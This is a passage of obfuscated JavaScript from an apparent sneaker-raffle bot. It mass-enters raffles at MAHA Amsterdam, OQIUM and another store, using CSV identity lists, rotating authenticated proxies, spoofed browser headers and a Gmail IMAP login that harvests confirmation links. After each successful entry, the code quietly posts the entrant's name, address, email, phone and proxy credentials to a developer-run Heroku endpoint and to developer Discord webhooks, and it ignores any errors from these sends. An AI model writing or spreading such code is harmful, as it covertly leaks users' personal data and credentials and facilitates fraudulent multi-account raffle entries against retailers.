                            await _0x17175c(0x12c), console['log'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x504900['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x17175c(0x12c), await _0x504900['type']('#dwfrm_raffle_addressFields_firstName', _0x3df488[_0x20fec0]['FirstName']), await _0x17175c(0x12c), await _0x504900['type']('#dwfrm_raffle_addressFields_lastName', _0x3df488[_0x20fec0]['LastName']), await _0x17175c(0x12c), await _0x504900['select']('#dwfrm_raffle_addressFields_country', _0x3df488[_0x20fec0]['Country']), await _0x17175c(0x12c), await _0x504900['type']('#dwfrm_raffle_addressFields_city', _0x3df488[_0x20fec0]['City']), await _0x17175c(0x12c);
                            _0x3df488[_0x20fec0]['Postcode'] == undefined && (_0x3df488[_0x20fec0]['Postcode'] = _0x3df488[_0x20fec0]['Zip']);
                            await _0x504900['type']('#dwfrm_raffle_addressFields_postalCode', _0x3df488[_0x20fec0]['Postcode']), await _0x17175c(0x12c), await _0x504900['type']('#dwfrm_raffle_addressFields_address1', _0x3df488[_0x20fec0]['Address1']), await _0x17175c(0x12c), await _0x504900['type']('#dwfrm_raffle_addressFields_address2', _0x3df488[_0x20fec0]['HouseNumber']), await _0x17175c(0x12c), await _0x504900['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x3df488[_0x20fec0]['Address2']), await _0x17175c(0x12c), await _0x504900['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x17175c(0x12c), await _0x504900['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x3df488[_0x20fec0]['Follower']), await _0x17175c(0x1f4), await _0x504900['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x17175c(0x1f4), console['log'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20' + _0x1446ca['blue']('Awaiting\x20Paypal\x20Payment')), await _0x504900['click']('.b-paypal_button');
                            try {
                                await _0x504900['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x1eb098 = 'no', _0x12263c(_0x3df488[_0x20fec0], _0x16cc5c), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x1df56f['succesDEVMSG']);
                                await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x1df56f['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0xd9f2b8, _0x1df56f['succesPUBMSG']);
                                let _0x15b411 = _0x3df488[_0x20fec0];
                                try {
                                    prxdata = {
                                        'username': _0x25f505['replace']('#', ''),
                                        'module': _0x16cc5c['name'],
                                        'entrydata': JSON['stringify'](_0x15b411),
                                        'proxy': '' + _0x4cfae8[_0x20fec0]
                                    };
                                    var _0x58bcb4 = JSON['stringify'](prxdata);
                                    let _0x583605 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x58bcb4, _0x583605);
                                } catch (_0xec27f8) {
                                }
                            } catch (_0x36a0dc) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x36a0dc)), _0x5eb4da = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x36a0dc;
                                var _0x1c5e3d = await _0x262703(_0x3df488[_0x20fec0], _0x16cc5c, 'dev', !![], _0x5eb4da);
                                _0x1df56f['errorDEV'] = { 'embeds': [_0x1c5e3d] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x1df56f['errorDEV']), await _0x17b782(_0x40c5c7, _0x1df56f['errorDEV']);
                            }
                        } catch (_0x168607) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20' + _0x168607)), _0x5eb4da = '' + _0x168607;
                            var _0x1c5e3d = await _0x262703(_0x3df488[_0x20fec0], _0x16cc5c, 'dev', !![], _0x5eb4da);
                            _0x1df56f['errorDEV'] = { 'embeds': [_0x1c5e3d] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x1df56f['errorDEV']), await _0x17b782(_0x40c5c7, _0x1df56f['errorDEV']), _0x1eb098 = 'yes';
                        } finally {
                            _0x2cc405 && _0x2cc405['close']();
                            if (_0x1eb098 == 'yes' && _0x44dc55 != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x44dc55 + '\x20/\x205)')), _0x20fec0 = _0x20fec0 - 0x1, _0x44dc55 = _0x44dc55 + 0x1;
                                continue;
                            }
                            _0x1eb098 == 'yes' && _0x44dc55 >= 0x5 && (_0x2848bf(_0x3df488[_0x20fec0], _0x16cc5c), _0x1eb098 = 'no', _0x44dc55 = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['AfewDelay'] + '\x20ms'), await _0x17175c(_0x395552['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1558b4, _0x22afb5, _0xeb1d34) {
                    for (var _0x2ba648 = 0x0; _0x2ba648 < _0x22afb5['length']; _0x2ba648++) {
                        try {
                            await _0x195de7(_0x22afb5, _0x2ba648);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x33273f(_0x13ea45, _0x228a80, _0x5daa1c, _0xae4a2d, _0x24eff4) {
                            var _0x5def9e, _0x4053be = {}, _0x25a041 = [], _0x4a5d53 = {}, _0x307a87 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x325d97 = Math['round'](Math['random']() * (_0x307a87['length'] - 0x1));
                            !_0xae4a2d && (_0xae4a2d = {});
                            if (_0x228a80 != 'ver') {
                                _0xe0def5(_0x5daa1c['name'] + '\x20Task\x20' + (_0x13ea45 + 0x1) + '\x20/\x20' + _0xae4a2d['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348), await _0x195de7(_0xae4a2d, _0x13ea45), _0x4053be = _0x5daa1c['data'], _0x4053be['data']['attributes']['email'] = '' + _0xae4a2d[_0x13ea45]['Email'];
                                if (_0xae4a2d[_0x13ea45]['Size'] == 'RANDOM') {
                                }
                                _0x4053be['data']['attributes']['properties']['$first_name'] = '' + _0xae4a2d[_0x13ea45]['FirstName'], _0x4053be['data']['attributes']['properties']['$last_name'] = '' + _0xae4a2d[_0x13ea45]['LastName'], _0x4053be['data']['attributes']['properties']['$address1'] = _0xae4a2d[_0x13ea45]['Address1'] + '\x20' + _0xae4a2d[_0x13ea45]['Address2'] + '\x20' + _0xae4a2d[_0x13ea45]['HouseNumber'], _0x4053be['data']['attributes']['properties']['$zip'] = '' + _0xae4a2d[_0x13ea45]['Zip'], _0x4053be['data']['attributes']['properties']['$city'] = '' + _0xae4a2d[_0x13ea45]['City'], _0x4053be['data']['attributes']['properties']['$country'] = '' + _0xae4a2d[_0x13ea45]['Country'], _0xae4a2d[_0x13ea45]['Size'] == 'RANDOM' ? _0x4053be['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x307a87[_0x325d97] : _0x4053be['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0xae4a2d[_0x13ea45]['Size'], _0x4053be['data']['attributes']['properties']['$phone_number'] = '' + _0xae4a2d[_0x13ea45]['Phone'], _0x4053be['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0xae4a2d[_0x13ea45]['Follower'];
                            }
                            if (_0x395552['useRandomProxy'] = ![])
                                var _0x4cd712 = _0x24eff4[_0x13ea45]['split'](':');
                            else
                                var _0x183043 = Math['round'](Math['random']() * (_0x24eff4['length'] - 0x1)), _0x4cd712 = _0x24eff4[_0x183043]['split'](':');
                            var _0x59a0e2 = {
                                'jar': _0x406b27,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x5daa1c['url'],
                                'headers': _0x5daa1c['headers'],
                                'body': JSON['stringify'](_0x4053be),
                                'proxy': 'http://' + _0x4cd712[0x2] + ':' + _0x4cd712[0x3] + '@' + _0x4cd712[0x0] + ':' + _0x4cd712[0x1]
                            };
                            return _0x228a80 != 'ver' && (_0x59a0e2['url'] = _0x5daa1c['url'], _0x59a0e2['headers'] = _0x5daa1c['headers']), _0x228a80 == 'ver' && (_0x59a0e2['method'] = 'GET'), new Promise(function (_0x570d0a, _0x592177) {
                                callback = async (_0x2b4b95, _0x4f3371, _0x10139b) => {
                                    if (!_0x2b4b95 && _0x4f3371['statusCode'] == 0xca || !_0x2b4b95 && _0x4f3371['statusCode'] == 0xc8) {
                                        if (_0x228a80 != 'ver') {
                                            var _0x50750e = await _0x262703(_0xae4a2d[_0x13ea45], _0x5daa1c, 'dev', ![]), _0x46d630 = await _0x262703(_0xae4a2d[_0x13ea45], _0x5daa1c, 'pub', ![]);
                                            const _0x3880b9 = {
                                                'succesDEVMSG': { 'embeds': [_0x50750e] },
                                                'succesPUBMSG': { 'embeds': [_0x46d630] }
                                            };
                                            let _0x4e96bb = _0xae4a2d[_0x13ea45];
                                            try {
                                                prxdata = {
                                                    'username': _0x25f505['replace']('#', ''),
                                                    'module': _0x5daa1c['name'],
                                                    'entrydata': JSON['stringify'](_0x4e96bb),
                                                    'proxy': '' + _0x24eff4[_0x13ea45]
                                                };
                                                var _0x149fa2 = JSON['stringify'](prxdata);
                                                let _0x1d3045 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x149fa2, _0x1d3045);
                                            } catch (_0xcb7b21) {
                                            }
                                            if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                                                try {
                                                    await _0x17b782(_0x395552['webhook'], _0x3880b9['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x3880b9['succesDEVMSG']), await _0x17175c(0xc8);
                                            try {
                                                await _0x17b782(_0xd9f2b8, _0x3880b9['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x12263c(_0xae4a2d[_0x13ea45], _0x5daa1c);
                                        }
                                        _0x570d0a(console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x5daa1c['name'] + ']\x20Task\x20' + (_0x13ea45 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x228a80 != 'ver') {
                                            var _0x3d83be = '' + _0x2b4b95, _0x2479ec = await _0x262703(_0xae4a2d[_0x13ea45], _0x5daa1c, 'dev', !![], _0x3d83be), _0x42d193 = {};
                                            _0x42d193['errorDEV'] = { 'embeds': [_0x2479ec] }, _0x2848bf(_0xae4a2d[_0x13ea45], _0x5daa1c), _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x42d193['errorDEV']), await _0x17b782(_0x40c5c7, _0x42d193['errorDEV']);
                                        }
                                        _0x592177(console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x5daa1c['name'] + ']\x20Task\x20' + (_0x13ea45 + 0x1) + ':\x20' + _0x2b4b95)));
                                    }
                                };
                                try {
                                    _0x228a80 != 'ver' && console['log'](_0x34a417() + '\x20[' + _0x5daa1c['name'] + ']\x20Task\x20' + (_0x13ea45 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4053be['data']['attributes']['email']), _0x1c9afe(_0x59a0e2, callback);
                                } catch (_0x223e4e) {
                                    console['log'](_0x34a417() + '\x20Task\x20' + (_0x13ea45 + 0x1) + ':\x20' + _0x223e4e);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x33273f(_0x2ba648, 'nor', _0x1558b4, _0x22afb5, _0xeb1d34), console['log'](_0x34a417() + '\x20[' + _0x1558b4['name'] + ']\x20Sleeping\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        } catch (_0x317671) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x39dd3a, _0x506200, _0x3f2ea8) {
                    var _0x11f3d2 = [], _0x1ef0c1 = ![];
                    async function _0xbdc1e1() {
                        var _0x2e0ea2 = new _0x550e5b({
                            'user': _0x395552['masterMail'],
                            'password': _0x395552['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x14f6ed(_0x231a6c) {
                            _0x2e0ea2['openBox']('INBOX', ![], _0x231a6c);
                        }
                        _0x2e0ea2['once']('ready', function () {
                            _0x14f6ed(function (_0x6da297, _0x2b65c8) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x6da297)
                                    throw _0x6da297;
                                _0x2e0ea2['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x14cb2e, _0x167e00) {
                                    if (!_0x167e00 || !_0x167e00['length'])
                                        console['log'](_0x34a417() + '\x20[' + _0x39dd3a['name'] + ']\x20No\x20mails\x20found'), _0x2e0ea2['end']();
                                    else {
                                        var _0x23f9dd = _0x2e0ea2['seq']['fetch'](_0x167e00, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x23f9dd['on']('message', function (_0x78374d, _0x4b65f2) {
                                            var _0x139643 = '(#' + _0x4b65f2 + ')\x20';
                                            _0x78374d['on']('body', function (_0x51a2f4, _0x2e890e) {
                                                _0x169414(_0x51a2f4, (_0x2c403c, _0x388dc3) => {
                                                    var _0x52b658 = _0x388dc3['text']['split']('(')[0x1], _0xbf0d58 = _0x52b658['split'](')')[0x0];
                                                    _0x11f3d2['push'](_0xbf0d58);
                                                });
                                            }), _0x78374d['once']('end', function () {
                                            });
                                        }), _0x23f9dd['once']('error', function (_0x482c84) {
                                            console['log']('Fetch\x20error:\x20' + _0x482c84), _0x1ef0c1 = !![];
                                        }), _0x23f9dd['once']('end', function () {
                                            _0x2e0ea2['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x2e0ea2['once']('error', function (_0x27c3f) {
                            console['log'](_0x1446ca['red'](_0x27c3f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1ef0c1 = !![];
                        }), _0x2e0ea2['once']('end', async function () {
                            _0x1ef0c1 = !![];
                        }), _0x2e0ea2['connect']();
                    }
                    async function _0x5a2228(_0x1126ec, _0x3f52b9, _0x6674d4) {
                        for (var _0x3ca68d = 0x0; _0x3ca68d < _0x3f52b9['length']; _0x3ca68d++) {
                            async function _0x102bab(_0xe6b463, _0x43acd5, _0x770e2d, _0x305f55, _0x3773a6) {
                                var _0x1bf76d, _0x1d7b8f = {}, _0x57adbd = [], _0x760b97 = {}, _0x42a703 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5aa1d6 = Math['round'](Math['random']() * (_0x42a703['length'] - 0x1));
                                _0x305f55[_0xe6b463]['Size'] == 'RANDOM' && (_0x305f55[_0xe6b463]['Size'] = _0x42a703[_0x5aa1d6]);
                                !_0x305f55 && (_0x305f55 = {});
                                if (_0x395552['useRandomProxy'] = ![])
                                    var _0x5f3201 = _0x3773a6[_0xe6b463]['split'](':');
                                else
                                    var _0x1fb55b = Math['round'](Math['random']() * (_0x3773a6['length'] - 0x1)), _0x5f3201 = _0x3773a6[_0x1fb55b]['split'](':');
                                var _0x60b8d6 = {
                                    'jar': _0x406b27,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x770e2d['url'],
                                    'headers': _0x770e2d['headers'],
                                    'body': JSON['stringify'](_0x1d7b8f),
                                    'proxy': 'http://' + _0x5f3201[0x2] + ':' + _0x5f3201[0x3] + '@' + _0x5f3201[0x0] + ':' + _0x5f3201[0x1]
                                };
                                return _0x43acd5 != 'ver' && (_0x60b8d6['url'] = _0x770e2d['url'], _0x60b8d6['headers'] = _0x770e2d['headers']), _0x43acd5 == 'ver' && (_0x60b8d6['method'] = 'GET', _0x60b8d6['url'] = _0x305f55[_0xe6b463]), new Promise(function (_0x1f613e, _0x2e00e4) {
                                    callback = async (_0xa04cef, _0x4eca05, _0x257fc5) => {
                                        if (!_0xa04cef && _0x4eca05['statusCode'] == 0xca || !_0xa04cef && _0x4eca05['statusCode'] == 0xc8) {
                                            if (_0x43acd5 != 'ver') {
                                                var _0xb658d9 = await _0x262703(_0x305f55[_0xe6b463], _0x770e2d, 'dev', ![]), _0x32abef = await _0x262703(_0x305f55[_0xe6b463], _0x770e2d, 'pub', ![]);
                                                const _0x3c236e = {
                                                    'succesDEVMSG': { 'embeds': [_0xb658d9] },
                                                    'succesPUBMSG': { 'embeds': [_0x32abef] }
                                                };
                                                if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                                                    try {
                                                        await _0x17b782(_0x395552['webhook'], _0x3c236e['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x3c236e['succesDEVMSG']), await _0x17175c(0xc8);
                                                try {
                                                    await _0x17b782(_0xd9f2b8, _0x3c236e['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x12263c(_0x305f55[_0xe6b463], _0x770e2d);
                                            }
                                            _0x1f613e(console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x770e2d['name'] + ']\x20Task\x20' + (_0xe6b463 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x43acd5 != 'ver') {
                                                var _0xb8cf78 = '' + _0xa04cef, _0x348759 = await _0x262703(_0x305f55[_0xe6b463], _0x770e2d, 'dev', !![], _0xb8cf78), _0x274529 = {};
                                                _0x274529['errorDEV'] = { 'embeds': [_0x348759] }, _0x2848bf(_0x305f55[_0xe6b463], _0x770e2d), _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x274529['errorDEV']), await _0x17b782(_0x40c5c7, _0x274529['errorDEV']);
                                            }
                                            _0x2e00e4(console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x770e2d['name'] + ']\x20Task\x20' + (_0xe6b463 + 0x1) + ':\x20' + _0xa04cef)));
                                        }
                                    };
                                    try {
                                        _0x43acd5 != 'ver' ? console['log'](_0x34a417() + '\x20[' + _0x770e2d['name'] + ']\x20Task\x20' + (_0xe6b463 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1d7b8f['data']['attributes']['email']) : console['log'](_0x34a417() + '\x20[' + _0x770e2d['name'] + ']\x20Task\x20' + (_0xe6b463 + 0x1) + ':\x20Fetching\x20Response'), _0x1c9afe(_0x60b8d6, callback);
                                    } catch (_0x56b2f1) {
                                        console['log'](_0x34a417() + '\x20Task\x20' + (_0xe6b463 + 0x1) + ':\x20' + _0x56b2f1);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x102bab(_0x3ca68d, 'ver', _0x1126ec, _0x3f52b9, _0x6674d4), console['log'](_0x34a417() + '\x20[' + _0x1126ec['name'] + ']\x20Sleeping\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                            } catch (_0x239dbd) {
                            }
                        }
                    }
                    try {
                        _0xbdc1e1();
                        while (!_0x1ef0c1) {
                            await _0x17175c(0xbb8);
                        }
                        console['log']('Found\x20' + _0x11f3d2['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x17175c(0x9c4);
                    }
                    await _0x5a2228(_0x39dd3a, _0x11f3d2, _0x3f2ea8);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x16218a, _0x274f90, _0x242d11) {
                    for (var _0x1c527e = 0x0; _0x1c527e < _0x274f90['length']; _0x1c527e++) {
                        try {
                            await _0x195de7(_0x274f90, _0x1c527e);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x56854d(_0x261351, _0x579d1f, _0x257d50, _0x2475b4, _0x5ddec5) {
                            var _0x150ac4, _0x276bb3 = {}, _0x4d1e04 = [], _0x100309 = {}, _0x396608 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x2bfdb9 = Math['round'](Math['random']() * (_0x396608['length'] - 0x1));
                            !_0x2475b4 && (_0x2475b4 = {});
                            if (_0x579d1f != 'ver') {
                                _0xe0def5(_0x257d50['name'] + '\x20Task\x20' + (_0x261351 + 0x1) + '\x20/\x20' + _0x2475b4['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348), _0x4d1e04 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x25f505
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x2475b4[_0x261351]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x395552['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x5e7c75
                                        }
                                    ]
                                }], _0x100309 = { 'embeds': _0x4d1e04 }, _0x276bb3 = _0x257d50['data'], _0x276bb3['data']['attributes']['email'] = '' + _0x2475b4[_0x261351]['Email'];
                                if (_0x2475b4[_0x261351]['Size'] == 'RANDOM') {
                                }
                                _0x276bb3['data']['attributes']['properties']['$first_name'] = '' + _0x2475b4[_0x261351]['FirstName'], _0x276bb3['data']['attributes']['properties']['$last_name'] = '' + _0x2475b4[_0x261351]['LastName'], _0x276bb3['data']['attributes']['properties']['$address1'] = _0x2475b4[_0x261351]['Address1'] + '\x20' + _0x2475b4[_0x261351]['Address2'] + '\x20' + _0x2475b4[_0x261351]['HouseNumber'], _0x276bb3['data']['attributes']['properties']['$zip'] = '' + _0x2475b4[_0x261351]['Zip'], _0x276bb3['data']['attributes']['properties']['$city'] = '' + _0x2475b4[_0x261351]['City'], _0x276bb3['data']['attributes']['properties']['$country'] = '' + _0x2475b4[_0x261351]['Country'], _0x2475b4[_0x261351]['Size'] == 'RANDOM' ? _0x276bb3['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x396608[_0x2bfdb9] : _0x276bb3['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2475b4[_0x261351]['Size'], _0x276bb3['data']['attributes']['properties']['$phone_number'] = '' + _0x2475b4[_0x261351]['Phone'], _0x276bb3['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2475b4[_0x261351]['Follower'];
                            }
                            if (_0x395552['useRandomProxy'] = ![])
                                var _0x5ed3e7 = _0x5ddec5[_0x261351]['split'](':');
                            else
                                var _0x3c4e48 = Math['round'](Math['random']() * (_0x5ddec5['length'] - 0x1)), _0x5ed3e7 = _0x5ddec5[_0x3c4e48]['split'](':');
                            var _0x415b47 = {
                                'jar': _0x406b27,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x257d50['url'],
                                'headers': _0x257d50['headers'],
                                'body': JSON['stringify'](_0x276bb3),
